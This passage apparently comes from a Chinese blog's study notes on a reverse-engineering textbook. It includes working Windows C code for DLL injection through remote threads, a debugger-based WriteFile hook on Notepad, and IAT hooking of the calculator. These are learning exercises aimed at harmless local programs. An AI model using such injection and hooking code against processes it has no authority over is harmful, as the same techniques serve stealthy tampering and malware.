GetVersionEx(&amp;osvi);\n\n    if( osvi.dwMajorVersion >= 6 )\n        return TRUE;\n\n    return FALSE;\n&#125;\n\nBOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)\n&#123;\n    HANDLE      hThread = NULL;\n    FARPROC     pFunc = NULL;\n\n    if( IsVistaOrLater() )    // Vista, 7, Server2008\n    &#123;\n        // 直接调用 NtCreateThreadEx\n        pFunc = GetProcAddress(GetModuleHandle(L\"ntdll.dll\"), \"NtCreateThreadEx\");\n        if( pFunc == NULL )\n        &#123;\n            printf(\"MyCreateRemoteThread() : GetProcAddress(\\\"NtCreateThreadEx\\\") failed!!! [%d]\\n\",\n                   GetLastError());\n            return FALSE;\n        &#125;\n\n        ((PFNTCREATETHREADEX)pFunc)(&amp;hThread,\n                                    0x1FFFFF,\n                                    NULL,\n                                    hProcess,\n                                    pThreadProc,\n                                    pRemoteBuf,\n                                    FALSE,      // 第7各参数设置为0\n                                    NULL,\n                                    NULL,\n                                    NULL,\n                                    NULL);\n        if( hThread == NULL )\n        &#123;\n            printf(\"MyCreateRemoteThread() : NtCreateThreadEx() failed!!! [%d]\\n\", GetLastError());\n            return FALSE;\n        &#125;\n    &#125;\n    else                    // 2000, XP, Server2003\n    &#123;\n        hThread = CreateRemoteThread(hProcess, \n                                     NULL, \n                                     0, \n                                     pThreadProc, \n                                     pRemoteBuf, \n                                     0, \n                                     NULL);\n        if( hThread == NULL )\n        &#123;\n            printf(\"MyCreateRemoteThread() : CreateRemoteThread() failed!!! [%d]\\n\", GetLastError());\n            return FALSE;\n        &#125;\n    &#125;\n\n\tif( WAIT_FAILED == WaitForSingleObject(hThread, INFINITE) )\n    &#123;\n        printf(\"MyCreateRemoteThread() : WaitForSingleObject() failed!!! [%d]\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    return TRUE;\n&#125;\n\nBOOL InjectDll(DWORD dwPID, char *szDllName)\n&#123;\n    HANDLE hProcess = NULL;\n    LPVOID pRemoteBuf = NULL;\n    FARPROC pThreadProc = NULL;\n    DWORD dwBufSize = strlen(szDllName)+1;\n\n    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )\n    &#123;\n        printf(\"[ERROR] OpenProcess(%d) failed!!! [%d]\\n\", \n        dwPID, GetLastError());\n        return FALSE;\n    &#125;\n\n    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, \n                                MEM_COMMIT, PAGE_READWRITE);\n\n    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, \n                       dwBufSize, NULL);\n\n    pThreadProc = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \n                                 \"LoadLibraryA\");\n\n    if( !MyCreateRemoteThread(hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuf) )\n    &#123;\n        printf(\"[ERROR] MyCreateRemoteThread() failed!!!\\n\");\n        return FALSE;\n    &#125;\n\n    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\n\n    CloseHandle(hProcess);\n\n    return TRUE;\n&#125;\n\nint main(int argc, char *argv[])\n&#123;\n\t// adjust privilege\n    SetPrivilege(SE_DEBUG_NAME, TRUE);\n\n    // InjectDll.exe &lt;PID> &lt;dll_path>\n    if( argc != 3 )\n    &#123;\n        printf(\"usage : %s &lt;PID> &lt;dll_path>\\n\", argv[0]);\n        return 1;\n    &#125;\n\n    if( !InjectDll((DWORD)atoi(argv[1]), argv[2]) )\n    &#123;\n        printf(\"InjectDll() failed!!!\\n\");\n        return 1;\n    &#125;\n\n    printf(\"InjectDll() succeeded!!!\\n\");\n\n    return 0;\n&#125;\n\n\n\n这个代码挺好理解的，就是操作系统版本高的话就调用NtCreateThreadEx()，低版本的和之前一样\n\n\n\n\n\n\n\n提示\n这里作者提到：\n\n用户模式下, ntdll.dll库中的NtCreateThreadEx()与ZwCreateThreadEx(API其实是同一函数(二者起始地址是一样的)。\n而内核模式 (ntoskrnl.exe)中，二者是不同的\n请记住，用户模式下NtXXX()与ZwXXX()是一样的。\n\n这也印证了我上面调试时候API名字虽然不一样，但是可以直接修改参数\n\n\n注意的点\n上面的CreateThreadEx()是微软未公开的API，有一天可能他就改了，所以注入时候要小心\n\n0x44 InjDll.exe：DLL注入专用工具\nInjDll.exe支持Windows 2000以上的os，但是不支持Win 9x系列，支持32位64位os\n\n\n\n\n\n\n\n提示\n在各平台(32&#x2F;64位)进行 DLL注入时请注意以下几点:\n\n若目标进程为32位:Injector &amp; DIl一全为32位(PE32格式)。\n若目标进程为64位:Injector&amp;DIl一 全为64位(PE32+格式)。\n\n由于32&#x2F;64位进程在64位OS中均可运行，所以需要先查看目标进程的 PE文件格式，再选用合适的注入程序(IniDll32&#x2F;InjDll64)和DLL。\n\n\nQ：参数说明\n\nQ：注意事项\n\n由于采用了执行远程线程调用LoadLibrary()的工作方式，所以如果kernel32.dll未加载到目标进程，注入&#x2F;卸载操作将失败。\n向访问权限受限的(受保护的)进程、或应用了反注入技术的进程进行注入&#x2F;卸载操作时可能失败。\n原则上，进行N次注入操作后，必须执行相同次数的卸载操作，才能将相关DLL文件完全卸载。\n注人前先查看目标进程的PE文件格式(32位的PE32 还是64位的PE32+)，然后再选择相应的注人程序(IniDll32.exe&#x2F;InjDll64.exe)DLL文件(32位的PE32、64位的PE32+)。\n\n","slug":"re-engineer-core-principle-05","date":"2024-01-14T14:13:18.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"3a44a24f5a69ff4f99f1bd18acd6c0b5","title":"re-engineer-core-principle-04","content":"引言\n第三部分学了好久，主要是因为中间参加了两次面试，但是最后也没有去上实习，害！\n还是好好努力学习吧\n\n0x29 API钩取29.1 钩取Q：钩取(Hook)的整个流程如下\n\n使用反汇编器&#x2F;调试器把握程序的结构与工作原理\n开发需要的“钩子”代码，用于修改 Bug、改善程序功能\n灵活操作可执行文件与进程内存，设置“钩子”代码。\n\n钩取win32 API的技术称为API钩取\n\n之前学过了消息钩取，在21章。\n分析程序时，如果没有源代码，通常用到钩取\n\n29.2 API是啥API：Application Programming Interface\nQ：API的作用\n\n在Windows OS中，用户使用系统资源时，无法直接访问，需要向内核(Kernel)申请，申请的方法就是微软提供的Win32 API\n可以用API来访问进程、线程\n\nQ：为了运行实际的代码，所有进程默认都会加载kernel32.dll库，kernel32.dll库又会加载ntdll.dll库\n\n某些特定的系统进程(如smss.exe)不会加载kernel32.dll库\n\nQ：当用户模式的应用程序代码访问系统资源时\n\n\n由Ntdll.dll向内核模式发出访问申请\n\n假设notepad.exe要打开C:\\abc.txt文件\n\n首先在程序代码中调用msvcrt!fopen() API，然后引发一系列API调用\n\n\n使用常规系统资源的API会经由kermel32.dI1与Ntdll.dll不断向下调用，最后通过SYSENTER命令进人内核模式。\n\n\n29.3 API钩取在API调用前&#x2F;后运行用户的“钩子”代码。\n查看或操作传递给API的参数或API函数的返回值取消对API的调用，或更改执行流，运行用户代码。\n29.3.1 正常调用API\n\n因为CreateFile() API是kernel32.dll的导出函数，所以kernel32.dll区域中的CreateFile() API会被调用执行\n\n29.3.2 钩取API调用\n这里用户使用DLL注入把hook.dll注入到了notepad.exe的进程空间中，用hokk!MyCreateFile()钩取对kernel32!CreateFile的调用\n当notepad.exe调用CreateFile时，都会先调用hook.dll中的MyCreateFile\n\n\nQ：钩取函数的目的\n\n钩取某函数的目的有很多，如调用它之前或之后运行用户代码，或者干脆阻止它调用执行等\n\n29.4 技术图表\n29.4.1 方法对象(是什么)Q：API钩取方法的分类\n\n根据针对的对象不同，API钩取大致可以分为静态方法和动态方法\n\n静态方法针对的对象是文件，动态方法针对的是进程内存\n\n\n\n29.4.2 位置(何处)Q：图表中指出了实施API钩取应该操作的部分\nIAT：\n\nIAT将其内部的API地址更改为钩取函数地址。\n该方法的优点是实现起来非常简单，缺点是无法钩取不在IAT而在程序中使用的API(如动态加载并使用DLL时)。\n\n代码\n\n系统库(*.dll)映射到进程内存时，从中查找API的实际地址，并直接修改代码。\n该方法应用范围非常广泛，具体实现中常有如下几种选择:\n使用JMP指令修改起始代码:\n覆写函数局部\n仅更改必须部分的局部\n\n\n\nEAT:\n\n将记录在DLL的EAT中的API起始地址更改为钩取函数地址，也可以实现API钩取。\n这种方法从概念上看非常简单，但在具体实现上不如前面的Code方法简单、强大\n所以修改EAT的这种方法并不常用。\n\n29.4.3 技术(如何)向目标进程内存设置钩取函数的具体技术，分成调试法和注入法。\n注入法分成代码注入和DLL注入\n调试\n\n通过调试目标进程钩取API，因为调试器拥有被挑事者的所有权限(执行控制、内存访问等)，可以向被调试进程的任意内存设置钩取函数\n这里说的调试器不是ollydbg、idapro，而是由用户直接编写的，用来钩取的程序。\n使用调试API附加到目标进程，然后设置钩取函数，当重新运行时，就实现API钩取了\n\n\n\nQ：注入\nDLL注入\n\n先在要注入的DLL中创建钩取代码和设置代码，然后在DLLMain中调用设置代码，注入的同时完成API钩取\n\n代码注入\n\nDLL注入技术针对的是完整的PE映像,\n代码注入是在执行代码与数据被注入的状态下直接获取自身所需API地址来使用的。\n\n29.4.4 APIQ：除了技术图表中的API\n\n还用到OpenProcess()、WriteProcessMemory()、ReadProcessMemory()等API\n\n0x30 记事本WriteFile() API钩取\n这一章会钩取记事本的kernel32!WriteFile()  API\n\n30.1 用到的技术\n\n使用调试技术，这种技术会向用户提供简单的接口，使用户能控制目标进程的运行，并可以自由的使用进程内存\n\n30.2 调试器调试器(Debugger)：进行调试的程序\n被调试者(Debuggee)：被调试的程序\n调试器功能\n调试器用来确认被调试者是否正确运行，发现(未能预料到的)程序错误。\n调试器能够逐执行被调试者的指令，拥有对寄存器与内存的所有访问权限。\n\n调试器工作原理调试进程经过注册后，每当被调试者发生调试事件(Debug Event)时，OS就会暂停其运行并向调试器报告相应事件。调试器对相应事件做适当处理后，使被调试者继续运行口\n\n一般的异常(Exception)也属于调试事件。\n若相应进程处于非调试，调试事件会在其自身的异常处理或OS 的异常处理机制中被处理掉。\n调试器无法处理或不关心的调试事件最终由OS处理\n\n\n调试事件EXCEPTION_DEBUG_EVENT\nCREATE_THREAD_DEBUG_EVENT\nCREATE_PROCESS_DEBUG_EVENT\nEXIT_THREAD_DEBUG_EVENT\nEXIT_PROCESS_DEBUG_EVENT\nLOAD_DLL_DEBUG_EVENT\nUNLOAD_DLL_DEBUG_EVENT\nOUTPUT_DEBUG_STRING_EVENT\nRIP_EVENT\n\n在这些调试事件中，与调试相关的事件为EXCEPTION_DEBUG_EVENT，下面是其相关的异常列表\n\n\n这些异常中，调试器必须处理的是EXCEPTION_BREAKPOINT异常。\n\n断点对应的汇编指令为INT3，IA-32指令为0xCC\n\n代码遇到INT3指令即中断运行，EXCEPTION_BREAKPOINT异常事件被传送到调试器，\n\n\n30.3 调试技术流程下面详细讲解借助调试技术钩取API的方法\nQ：基本思路\n\n在“调试器-被调试者”的状态下将被调试者的API起始部分修改为OxCC\n\n控制权转移到调试器后执行指定操作，最后使被调试者重新进入运行状态。\n\n\n上面提到了调试器必须处理的异常就有0xcc，当遇到0xcc后，os就会暂停被调试者的运行，让调试器对相应事件进行处理\n\n\nQ：具体的调试流程\n\n对想钩取的进程进行附加操作，使之成为被调试者\n“钩子”将API起始地址的第一个字节修改为0xCC\n调用相应API时，控制权转移到调试器;\n执行需要的操作(操作参数、返回值等);\n脱钩:将0xCC恢复原值(为了正常运行API);\n运行相应API(无0xCC的正常状态);\n“钩子”:再次修改为0xCC(为了继续钩取)\n控制权返还被调试者。\n\nQ：上面是最简单的情形，在此基础上可以有多种变化。\n\n既可以不调用原始API，也可以调用用户提供的客户API:\n可以只钩取一次，也可以钩取多次。\n实际应用时，根据需要适当调整即可\n\n30.4 练习钩取Notepad.exe的WriteFile() API，保存文件时操作输入参数，将小写字母全部转换为大写字母。\n\n也就是Notepad.exe在保存文件时，小写字母会先变成大写，再保存\n\nQ：按照书上操作\n\n发现我输入的小写字母，之后保存文件\n再打开变成了大写字母\n\n\n30.5 工作原理假设notepad.exe在保存文件中的某些内容时，会调用kernel32!WriteFile() API\n栈Q：WriteFile定义\n\n\n第二个参数(IpBufer)为数据缓冲区指针\n第三个参数(nNumberOfBytesToWrite)为要写的字节数。\n函数参数被以逆序形式存储到栈。\n\nQ：使用OllyDbg工具调试notepad，并查看程序栈。\n\n找到kernel32!API的地址，打断点\n\n运行Notepad.exe到断点处，随意向notepad.exe中输入值，并保存\n\n查看栈内状态\n\n\nBuffer是数据缓冲区指针，当把它压入栈后，查看此时栈内状态，查看073DD580区的内容，发现是我写在记事本中的字符串\n\n\nQ：钩取API后，用指定字符串覆盖数据缓冲区中的字符串就可以完成目的\n执行流\n现在我们已经知道修改被调试进程的哪个部分了，接下来只要正常运行WriteFile()，将修改后的字符串保存到文件就可以了\n\nQ：现在用调试方法钩取API\n\n用前面介绍的hookdbg.exe,在WriteFile()API起始地址处设置断点(INT3)后，向被调试进程(notepad.exe)保存文件时，EXCEPTION_BREAKPOINT事件就会传给调试器(hookdbg.exe)。\n\nQ：那么，此时被调试者(notepad.exe)的EIP值是多少呢?\n\n应该是WriteFile的起始地址 +  1\n因为被调试者(notepad.exe)内部调用WriteFile()时，会在起始地址处遇见INT3指令，此时会执行这个指令，由于INT3指令长度为1，那么EIP就会＋1。之后跳转到hookdbg.exe中处理。\n修改了数据缓冲区的内容后，EIP值又被重新设置为WriteFile() API的起始地址\n\n脱钩 &amp; 钩子当hookdbg.exe中结束时，又会返回到notepad.exe内，继续执行。\nQ：若只将执行流返回到WriteFile()起始地址，再遇到相同的INT3指令时，就会陷人无限循环(发生EXCEPTION BREAKPOINT)。\n\n因为上面说过，修改了数据缓冲区的内容后，EIP又被重新设置为WriteFile() API的起始地址\n可能是为了执行起始地址处的正常指令\n\n\n为了不致于陷人无限循环，应该去除设置在WriteFile()API起始地址处的断点，即将0xCC更改为originalbyte(0x6A)(originalbyte在钩取API前已保存)。这一操作称为“脱钩”，就是取消对API的钩取。\n覆写好数据缓冲区并正常返回WriteFile（）API代码后，EIP值恢复为WriteFile（）API的地址\n修改后的字符串最终保存到文件。\n这就是hookdbg.cpp的工作原理。若只需要钩取1次，那到这儿就结束了。但如果需要不断钩取，就要再次设置断点。\n\n30.6 hookdbg.cpp源代码分析main函数及扼守要钩取的目标进程的pid，然后进入DebugLoop()\t\n//hookdbg.cpp\n\nint main(int argc, char* argv[])\n&#123;\n    DWORD dwPID;\n\n    if( argc != 2 )\n    &#123;\n        printf(\"\\nUSAGE : hookdbg.exe &lt;pid>\\n\");\n        return 1;\n    &#125;\n\n    // Attach Process\n    dwPID = atoi(argv[1]);\n\t// 使用DebugActiveProcess，将调试器hookdbg附加到目标进程notepad.exe中\n\t// dwPID为目标进程的pid\n    if(!DebugActiveProcess(dwPID))\n    &#123;\n        printf(\"DebugActiveProcess(%d) failed!!!\\n\"\n               \"Error Code = %d\\n\", dwPID, GetLastError());\n        return 1;\n    &#125;\n\n    // 调试器循环，处理来自被调试者的调试事件\n    DebugLoop();\n\n    return 0;\n&#125;\n\nDebugLoop()// hookdbg.cpp -> hookdbg.exe\n\nvoid DebugLoop()\n&#123;\n    DEBUG_EVENT de;\n    DWORD dwContinueStatus;\n\n    // 等待被调试者发生调试事件\n    while( WaitForDebugEvent(&amp;de, INFINITE))\n    &#123;\n        dwContinueStatus = DBG_CONTINUE;\n\n        // 被调试进程创建事件\n\t\t// 被调试进程启动或者attached时调用该函数\n        if( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )\n        &#123;\n            OnCreateProcessDebugEvent(&amp;de);\n        &#125;\n        // 异常事件\n\t\t// 说明遇到了INT3指令\n        else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )\n        &#123;\n            if(OnExceptionDebugEvent(&amp;de))\n                continue;\n        &#125;\n        // 被调试进程终止事件\n\t\t// 不调试了，结束了\n        else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )\n        &#123;\n            // 被调试者终止 -> 调试者终止\n            break;\n        &#125;\n\n        // 使得被调试者继续运行，相当于F9\n        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);\n    &#125;\n&#125;\n\n\n从被调试者接收事件并处理\n发生调试事件，WaitForDebugEvent() API就会把相关事件信息设置到第一个参数变量de中\n这里处理了三种事件， CREATE_PROCESS_DEBUG_EVENT  EXCEPTION_DEBUG_EVENT EXIT_PROCESS_DEBUG_EVENT\n\n处理 CREATE_PROCESS_DEBUG_EVENT\nLPVOID g_pfWriteFile = NULL;\nCREATE_PROCESS_DEBUG_INFO g_cpdi;\nBYTE g_chINT3 = 0xCC, g_chOrgByte = 0;\n\n// 被调试进程启动时\nBOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)\n&#123;\n    // 获取WriteFile() API地址\n\t// 获取的是调试进程的WriteFile() API地址，由于对于windows os的系统DLL而言，DLL在所有进程中都加载到相同地址，所以这样可以\n    g_pfWriteFile = GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"WriteFile\");\n\n    // API Hook - WriteFile()\n    // 更改WriteFile()第一个字节为0xCC(INT3)\n\t// 将事件信息保存在g_cpdi中\n    memcpy(&amp;g_cpdi, &amp;pde->u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO));\n\t// 读取目标进程中WriteFile() API的第一个字节到g_chOrgByte中\n\t// 后续正常运行WriteFile()时要用到\n    ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \n                      &amp;g_chOrgByte, sizeof(BYTE), NULL);\n\t// 将目标进程中WriteFile() API的第一个字节改为0xCC\n    WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \n                       &amp;g_chINT3, sizeof(BYTE), NULL);\n\n    return TRUE;\n&#125;\n\n\ng_cdi是CREATE_PROCESS_DEBUG_INFO结构体，通过它的hProcess成员(被调试进程的句柄)，可以钩取WriteFile() API\n\n\n下图显示WriteFile的第一个字节为0x6A\n\n\n\nEXCEPTION_DEBUG_EVENT\n脱钩\nWriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL);\n\n\n因为我再改完程序后，需要正常调用WriteFile\n\n\n获取线程上下文\n\n所有程序在内存中都以进程为单位运行，而进程的实际指令代码以线程为单位运行。WindowsOS是一个多线程(multi-thread)操作系统，同一进程中可以同时运行多个线程。多任务(multi-tasking)是将CPU资源划分为多个时间片(time-slice)，然后平等地逐一运行所有线程(考虑线程优先级)。CPU运行完一个线程的时间片而切换到其他线程时间片时，它必须将先前线程处理的内容准确备份下来，这样再次运行它时才能正常无误。\n\n再次运行先前线程时，必须有运行所需信息，这些重要信息指的就是CPU中各寄存器的值通过这些值，才能保证CPU能够再次准确运行它(内存信息栈&amp;堆存在于相应进程的虚拟空间\n\n负责保护CPU寄存器信息的就是CONTEXT结构体，每个线程都对应一个CONTEXT结构体\n\n\n\n\n\n\n获取线程上下文的代码\n\nGetThreadContext可以把指定线程(g_cpdi.hThread)的CONTEXT存储到ctx结构体变量，g_cpdi.hThreads是被调试者的主线程句柄\n\nctx.ContextFlags = CONTEXT_CONTROL;\nGetThreadContext(g_cpdi.hThread, &amp;ctx);\n\n\n获取WriteFile() 第 2, 3 个参数，也就是LpBuffer，nNumber0fBytesTowrite\n\n调用WriteFile()时，需要从参数中知道param2 缓冲区大小和param3 缓冲区地址这两个参数\n\n这里+8的原因是在进入函数之前，除了压参数，还要push返回地址\n\nReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);\nReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL);\n\n\n\n\n\n把小写字母转为大写字母，并覆写WriteFile()缓冲区\n\n获取数据缓冲区的地址与大小后，将其内容读到调试器的内存空间，把小写字母转换为大写字母。然后将修改后的大写字母覆写到原位置(被调试者的虚拟内存 )。\n\n\n\n#include \"windows.h\"\n#include \"stdio.h\"\n\n\n// 被调试进程遇到INT3时\nBOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)\n&#123;\n    CONTEXT ctx;\n    PBYTE lpBuffer = NULL;\n    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;\n    PEXCEPTION_RECORD per = &amp;pde->u.Exception.ExceptionRecord;\n\n    // 判断是否是断点\n    if( EXCEPTION_BREAKPOINT == per->ExceptionCode )\n    &#123;\n        // 判断断点是否在WriteFile() API处\n        if( g_pfWriteFile == per->ExceptionAddress )\n        &#123;\n            // #1. Unhook-脱钩\n            // 将WriteFile() API首字节改为g_chOrgByte，改成原值,这里因为都是在debugLoop()函数里，只不过是我分开看的，所以&amp;g_chOrgByte就是上一步的值\n            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \n                               &amp;g_chOrgByte, sizeof(BYTE), NULL);\n\n            // #2. Thread Context-获取被调试线程上下文\n\t\t\tctx.ContextFlags = CONTEXT_CONTROL;\n            GetThreadContext(g_cpdi.hThread, &amp;ctx);\n\n            // #3. 获得WriteFile() 第 2, 3 个参数，也就是LpBuffer，nNumber0fBytesTowrite\n            //   param 2 : ESP + 0x8\n            //   param 3 : ESP + 0xC\n\t\t\t// 分别将参数保存到 dwAddrOfBuffer 与 dwNumOfBytesToWrite 中\n            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), \n                              &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);\n            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0xC), \n                              &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL);\n\n\t\t\t// 接下来就是把小写字母转为大写字母，并放到原来的位置\n            // #4. 分配临时缓冲区lpBuffer\n            lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1);\n            memset(lpBuffer, 0, dwNumOfBytesToWrite+1);\n\n            // #5. 复制 WriteFile() 的dwAddrOfBuffer所指的字符串到临时缓冲区\n            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, \n                              lpBuffer, dwNumOfBytesToWrite, NULL);\n            printf(\"\\n### original string ###\\n%s\\n\", lpBuffer);\n\n            // #6. 将小写字母转为大写字母\n            for( i = 0; i &lt; dwNumOfBytesToWrite; i++ )\n            &#123;\n                if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A )\n                    lpBuffer[i] -= 0x20;\n            &#125;\n\n            printf(\"\\n### converted string ###\\n%s\\n\", lpBuffer);\n\n            // #7. 将lpBuffer放回原位\n            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, \n                               lpBuffer, dwNumOfBytesToWrite, NULL);\n            \n            // #8. 删除分配的临时缓冲区\n            free(lpBuffer);\n\n            // #9. 把线程上下文的EIP修改为WriteFile()起始地址，并恢复上下文\n            ctx.Eip = (DWORD)g_pfWriteFile;\n            SetThreadContext(g_cpdi.hThread, &amp;ctx);\n\n            // #10. 继续运行被调试进程\n            ContinueDebugEvent(pde->dwProcessId, pde->dwThreadId, DBG_CONTINUE);\n\t\t\tSleep(0);\n\n            // #11. 重新设置API Hook，把首字母设成0xCC，方便下次钩取\n            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \n                               &amp;g_chINT3, sizeof(BYTE), NULL);\n\n            return TRUE;\n        &#125;\n    &#125;\n\n    return FALSE;\n&#125;\n\n\n\n把线程上下文的EIP修改为WriteFile的起始地址\n\n\n把2里面获取的CONTEXT结构体的Eip成员，修改为WriteFile()的起始地址。EIP的当前地址为WriteFile() + 1\n\n修改好CONTEXT.Eip成员后，调用SetThreadContext() API\nctx.Eip &#x3D; (DWORD)g_pfWriteFile;\nSetThreadContext(g_cpdi.hThread, &amp;ctx);\n\n\n运行调试进程\nContinueDebugEvent(pde->dwProcessId, pde->dwThreadId, DBG_CONTINUE);\n\n设置API钩子，方便下次进行钩取\nWriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL);\n\n\n\n\n\n\n\n提示\n必须在调试终止前脱钩，否则调用API时其实部分仍然是0xCC，导致EXCEPTION_BREAKPOINT异常，由于此时不存在调试器，所以会终止被调试进程。\n\n\n总结Q：在OnExceptionDebugEvent()函数中调用了ContinueDebugEvent()函数后，为什么还要调用Sleep(0)函数?\n\n调用Sleep(0)函数可以释放当前线程的剩余时间片，即放弃当前线程执行的CPU时间片。\n\n也就是说，调用Sleep(0)函数后，CPU会立即执行其他线程。\n\n被调试进程(Notepad.exe)的主线程处于运行状态时，会正常调用WriteFile()API。然后经过一定时间，控制权再次转移给HookDbg.exe，Sleep(0)后面的“钩子”代码(WriteProcessMemory()API)会被调用执行。\n\n若没有Sleep(0)语句，Notepad.exe调用WriteFile()API的过程中，HookDbg.exe会尝试将WriteFileOAPI的首字节修改为OxCC。若运气不佳，这可能会导致内存访问异常\n\n\n也就是如果没有Sleep(0)的话，蓝线和黄线就会冲突，造成内存访问异常\n\n\n0x31 调试器\nOllyDbg和ida pro都是用户态的调试器\nWindbg既可以是用户态也可以是内核态，支持64位系统下的调试\n\n0x32 计算器显示中文数字API钩取中有一种是通过注入DLL文件来钩取某个API的，DLL文件注入目标进程后，修改IAT来更改进程中调用的特定API。\nQ：以Windows计算器为例\n\n向计算器进程插入用户的DLL文件，钩取IAT的user32.SetWindowTextW()地址。\n负责向计算器显示文本的user32.SetWindowTextW()被钩取后，计算器显示的是中文数字，不再是阿拉伯数字\n\n32.1 技术图表Q：下面带有下划线的部分就是通过DLL注入实现API钩取用到的技术\n\n只需要先把钩取的API在用户的DLL中重定义，然后再注入目标进程\n如果钩取的API不在目标进程的IAT中，那就无法用该技术进行钩取。\n也就是如果钩取的API是由程序代码动态加载DLL文件而使用的，那么就无法使用这项技术钩取\n\n\n\n\n32.2 选定目标APIQ：我现在有需求，如何钩取和需求对应的API呢\n\n学会检索\n如果搜不到，再通过经验猜\n\nQ：查看calc.exe的iAT\n\n可以看到有两个关键的API，SetWindowTextW，SetDlgItemTextW。\nSetDlgItemTextW内部调用了SetWindowTextW，所以假设只需要钩取SetWindowTextW API\n\n\nQ：SetWindowTextW API定义\n\n第一个参数为窗口句柄\n第二个是字符串指针\n也就是我钩取后，查看这个指针，把阿拉伯数字改成中文就可以了\n\n\n\n\n\n\n\n\n提示\nAPI名称中最后面的“W”表示该API是宽字符(Wide character)版本。与之对应，若API名称最后面的字符为“A”,则表示该API是ASCII码字符(ASCII character)版本。WindowsOS内部使用的宽字符指的就是Unicode码。\n\n如:SetWindowTextA()、SetWindowTextW()\n\n\n\nQ：在ollydbg内部查找SetWindowTextW()，并设置断点\n\n运行后，发现计算器正常显示的是0，也就是计算器的初始值是Text对应的值\n\n\n\n尝试更改Text的值为7，并重新运行，发现Text的值变成了7\n\n\n\n\n如果我把它改成中文呢，中文数字七的unicode码为4e03，发现真的变成了“七”\n\n\n\n\n\n\n\n\n\n\n提示\nunicode码中，每个汉字占用2个字节\n\n\n32.3 IAT钩取工作原理Q：进程的IAT中保存着程序调用的API地址\n\nIAT钩取通过修改IAT中保存的API地址来钩取某个API\n\n\n程序开始运行时，PE装载器会把user32.SetWindowTextW() API地址 77D0960E记录到地址01001110。\n\n01002628地址处的CAll DWORD PTR [01001110]指令会调用77D0960E处的SetWindowTextW() API\n\n执行完毕后返回(圆圈2)\n\n\nQ：IAT被钩取后计算器进程的运行过程\n\n\nhookiat.dll中有一个MySetWindowTextW()的钩取函数\n地址01002628处的call和图32-9中的call是一样的，只是把IAT中01001110地址处的值改了，改成了我构造的API的地址\n将IAT中保存的API起始地址变为用户函数的起始地址就是IAT钩取的基本原理。\n\n\n执行完01002628处的call之后，进入到MySetWindowTextW()函数。\n经过一系列处理，调用1000107D处的call 命令。调用user32.SetWindowTextW()地址\n地址1000B6D8位于hookiat.dll的data节区，是全局变量g_pOrgFunc的地址。注入DLL时，DLLMain()会获取并保存user32.SetWindowTextW()的地址\n执行完user32.SetWindowTextW()后，会按圆圈3返回，之后再按圆圈4返回。\n\nQ：像上面这种，先向目标进程(calc.exe)注入用户DLL(hookiat.dll)，然后在cacl.exe进程的IAT区域更改4bytes大小的地址，就可以钩取指定API\n32.4 练习示例\n实现上面描述的，通过修改IAT实现API钩取\t\n\n这里我运行后没有显示中文，可能是编码的问题\n\n\n\n32.5 源代码分析\nInjectDll.exe的内容和之前的代码基本结构相似，下面说明hookiat.dll的源代码\n\nDllMainBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n\tswitch( fdwReason )\n\t&#123;\n\t\tcase DLL_PROCESS_ATTACH : \n            // 保持原始 API 地址\n           \tg_pOrgFunc = GetProcAddress(GetModuleHandle(L\"user32.dll\"), \"SetWindowTextW\");\n\n            // # hook\n            //  用 user32!SetWindowTextW() 钩取 hookiat!MySetWindowText()\n\t\t\thook_iat(\"user32.dll\", g_pOrgFunc, (PROC)MySetWindowTextW);\n\t\t\tbreak;\n\n\t\tcase DLL_PROCESS_DETACH :\n            // # unhook\n            //   将 calc.exe 的 IAT 恢复原值\n            hook_iat(\"user32.dll\", (PROC)MySetWindowTextW, g_pOrgFunc);\n\t\t\tbreak;\n\t&#125;\n\n\treturn 